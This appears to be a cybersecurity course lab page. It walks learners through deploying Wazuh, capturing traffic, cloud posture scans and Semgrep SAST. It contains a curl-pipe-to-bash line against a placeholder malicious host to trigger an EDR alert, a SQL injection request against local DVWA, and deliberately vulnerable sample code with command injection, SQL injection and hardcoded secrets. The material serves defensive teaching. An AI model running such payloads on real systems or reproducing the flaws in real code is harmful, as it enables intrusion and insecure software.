@@ -1,0 +1,310 @@
+---
+title: "Security Tools Lab"
+description: "Hands-on: deploy an EDR sensor, capture and analyse network traffic, run a CSPM scanner, and perform a SAST scan."
+sidebar:
+  order: 97
+  label: "Tools Lab"
+tab: "cybersecurity"
+---
+
+## Objective
+
+Deploy and use four categories of security tools: EDR (endpoint), network analysis, CSPM (cloud), and SAST (application security).
+
+## Lab Setup
+
+### Prerequisites
+- Linux VM (Ubuntu 22.04+) with Docker
+- AWS account (free tier) OR Azure subscription
+- Sample web application (DVWA or a local Node.js app)
+
+## Exercise 1: Deploy EDR Sensor
+
+```bash
+# Install Wazuh (open-source EDR/SIEM) via Docker
+git clone https://github.com/wazuh/wazuh-docker.git
+cd wazuh-docker/single-node
+docker-compose up -d
+
+# Access: https://localhost:443 (admin/SecretPassword)
+# Deploy agent on a test VM:
+# Wazuh → Agents → Deploy new agent
+# Select OS: Linux, Server IP: <your-server-ip>
+
+# Or install agent manually:
+curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add -
+echo "deb https://packages.wazuh.com/4.x/apt/ stable main" | tee /etc/apt/sources.list.d/wazuh.list
+apt-get update
+apt-get install wazuh-agent
+systemctl start wazuh-agent
+
+# Verify agent is connected
+# Wazuh Dashboard → Agents → (should show active agent)
+```
+
+**Task**: Generate a test alert by running a suspicious command on the agent:
+
+```bash
+# On the agent VM
+curl http://malicious.example.com/malware.sh | bash
+
+# Check Wazuh dashboard for the alert
+```
+
+## Exercise 2: Network Traffic Capture and Analysis
+
+```bash
+# Start a packet capture on your test VM
+sudo tcpdump -i eth0 -w lab-capture.pcap -c 10000
+
+# Generate some traffic
+curl http://example.com
+curl https://google.com
+ping -c 5 8.8.8.8
+nslookup github.com
+
+# Stop the capture (Ctrl+C)
+
+# Analyse with tcpdump
+tcpdump -r lab-capture.pcap -nn
+
+# Top talkers
+tcpdump -r lab-capture.pcap -nn | awk '{print $3}' | cut -d. -f1-4 | sort | uniq -c | sort -nr | head
+
+# DNS queries
+tcpdump -r lab-capture.pcap port 53 -nn
+
+# Analyse with Zeek (if installed)
+zeek -r lab-capture.pcap local
+cat conn.log | zeek-cut ts id.orig_h id.resp_h proto service duration | head
+cat dns.log | zeek-cut query answer | head
+```
+
+**Task**: Identify the top 5 destination IPs and determine what services they are (use `nmap -sV` or dig to identify).
+
+## Exercise 3: Run a CSPM Scan
+
+```bash
+# Install ScoutSuite
+pip install scoutsuite
+
+# Configure AWS credentials
+export AWS_ACCESS_KEY_ID=AKIA...
+export AWS_SECRET_ACCESS_KEY=...
+
+# Run a scan
+scout aws --report-dir ./scout-report
+
+# Open the HTML report
+# Open scout-report/scoutsuite-report.html in browser
+
+# Find at least 3 findings and note the recommended remediation
+```
+
+**Task**: Identify the top 3 security issues in your cloud account and document what AWS config changes are needed to fix them.
+
+## Exercise 4: SAST Scan
+
+```bash
+# Create a deliberately vulnerable test file
+cat > test-vuln.js << 'EOFF'
+const express = require('express');
+const app = express();
+
+// Command Injection Vulnerability
+app.get('/ping', (req, res) => {
+  const ip = req.query.ip;
+  const result = require('child_process').execSync(`ping -c 1 ${ip}`);
+  res.send(result.toString());
+});
+
+// SQL Injection Vulnerability
+app.get('/user', (req, res) => {
+  const id = req.query.id;
+  const query = `SELECT * FROM users WHERE id = ${id}`;
+  db.execute(query, (err, rows) => {
+    res.json(rows);
+  });
+});
+
+// Hardcoded Secret
+const API_KEY = "sk-live-abc123def456ghi789jkl";
+app.listen(3000);
+EOFF
+
+# Run Semgrep scan
+pip install semgrep
+semgrep scan --config=auto test-vuln.js
+
+# Expected findings:
+# 1. Command injection (CWE-78)
+# 2. SQL injection (CWE-89)
+# 3. Hardcoded secret (CWE-798)
+```
+
+**Task**: Fix each vulnerability and run semgrep again to confirm the findings are resolved.
+
+## Deliverables
+
+1. **EDR**: Screenshot of Wazuh dashboard showing an active agent and at least one security alert
+2. **Network**: Screenshot of tcpdump/Zeek output showing DNS queries and top talkers
+3. **CSPM**: Screenshot of ScoutSuite report showing at least 3 findings
+4. **SAST**: Screenshot of Semgrep output showing 3+ findings, then screenshot after fixes (0 findings)
+
+## Bonus Challenge
+
+Set up a complete CI/CD pipeline with security scanning:
+- Create a GitHub repository with a sample Node.js app
+- Add GitHub Actions workflow with SAST (Semgrep), SCA (Dependabot), and secret scanning (TruffleHog)
+- Create a pull request with a deliberate vulnerability
+- Show that the pipeline blocks the PR
+
+<Aside variant="tip">
+The bonus challenge simulates a real DevSecOps pipeline. The key insight: security scanning integrated into CI/CD is vastly more effective than periodic scanning because every change is checked before it reaches production.
+</Aside>
+
+## Step-by-Step Lab Guide
+
+### Lab 1: Deploy EDR Sensor
+
+```bash
+# Install CrowdStrike Falcon sensor (or use free alternative: Wazuh)
+# Wazuh is open-source EDR/XDR — suitable for lab use
+
+docker run -d \
+  --name wazuh-manager \
+  -p 1514:1514/udp \
+  -p 1515:1515 \
+  -p 55000:55000 \
+  wazuh/wazuh-manager
+
+# On the target machine, install Wazuh agent
+docker run -d \
+  --name wazuh-agent \
+  -e MANAGER_IP=10.0.0.100 \
+  wazuh/wazuh-agent
+
+# Verify agent is connected
+curl -u wazuh:wazuh https://localhost:55000/agents
+```
+
+### Lab 2: Network Traffic Analysis
+
+```bash
+# Capture traffic between two containers
+docker network create security-lab
+
+# Deploy vulnerable web app
+docker run -d \
+  --name dvwa \
+  --network security-lab \
+  --network-alias dvwa \
+  -p 8080:80 \
+  vulnerables/web-dvwa
+
+# Capture traffic
+docker run -d \
+  --name sniffer \
+  --network security-lab \
+  --cap-add NET_ADMIN \
+  nicolaka/netshoot \
+  tcpdump -i eth0 -w /data/capture.pcap
+
+# Generate malicious traffic
+curl -X POST "http://localhost:8080/vulnerabilities/sqli/" \
+  -d "id=1' OR '1'='1&Submit=Submit"
+
+# Stop capture and analyse with Wireshark (download pcap)
+```
+
+### Lab 3: CSPM Scan
+
+```bash
+# Install Prowler for AWS assessment
+pip install prowler
+
+# Configure AWS credentials (use a test/dedicated account)
+export AWS_ACCESS_KEY_ID=AKIA...
+export AWS_SECRET_ACCESS_KEY=...
+
+# Run scan
+prowler aws -M html,json
+
+# View results
+open prowler/output/html/index.html
+
+# Install ScoutSuite for multi-cloud
+pip install scoutsuite
+
+# Run ScoutSuite
+scout aws
+```
+
+### Lab 4: SAST with Semgrep
+
+```bash
+# Install Semgrep
+pip install semgrep
+
+# Create a sample vulnerable app
+cat > vulnerable-app.py << 'EOF'
+import sqlite3
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/user/<int:user_id>')
+def get_user(user_id):
+    # BAD: SQL injection vulnerability
+    conn = sqlite3.connect('users.db')
+    query = f"SELECT * FROM users WHERE id = {user_id}"
+    result = conn.execute(query).fetchone()
+    return {"username": result[0]}
+
+@app.route('/login')
+def login():
+    username = request.args.get('username')
+    password = request.args.get('password')
+    # BAD: Hardcoded credentials
+    if username == "admin" and password == "password123":
+        return {"status": "success"}
+    return {"status": "fail"}
+EOF
+
+# Run Semgrep scan
+semgrep scan --config=auto vulnerable-app.py
+```
+
+### Lab 5: SIEM Integration
+
+```bash
+# Deploy ELK stack for log analysis
+docker run -d \
+  --name elasticsearch \
+  -p 9200:9200 \
+  -e "discovery.type=single-node" \
+  docker.elastic.co/elasticsearch/elasticsearch:8.11.0
+
+docker run -d \
+  --name kibana \
+  -p 5601:5601 \
+  -e ELASTICSEARCH_HOSTS=http://elasticsearch:9200 \
+  docker.elastic.co/kibana/kibana:8.11.0
+
+# Ingest Zeek logs into Elasticsearch
+# Install Filebeat on the machine running Zeek
+filebeat setup --index-management -E output.logstash.enabled=false \
+  -E 'output.elasticsearch.hosts=["localhost:9200"]'
+
+# Create dashboard in Kibana for Zeek conn.log, dns.log, http.log
+```
+
+## Deliverables Checklist
+
+- [ ] Lab environment deployed (Docker with security-lab network)
+- [ ] EDR/Wazuh agent installed and reporting
+- [ ] Network capture of SQL injection attempt
+- [ ] CSPM scan (Prowler or ScoutSuite) results
+- [ ] SAST scan results showing vulnerability findings
+- [ ] Bonus challenge: CI/CD pipeline blocking vulnerable code
+- [ ] SIEM dashboard with ingested logs
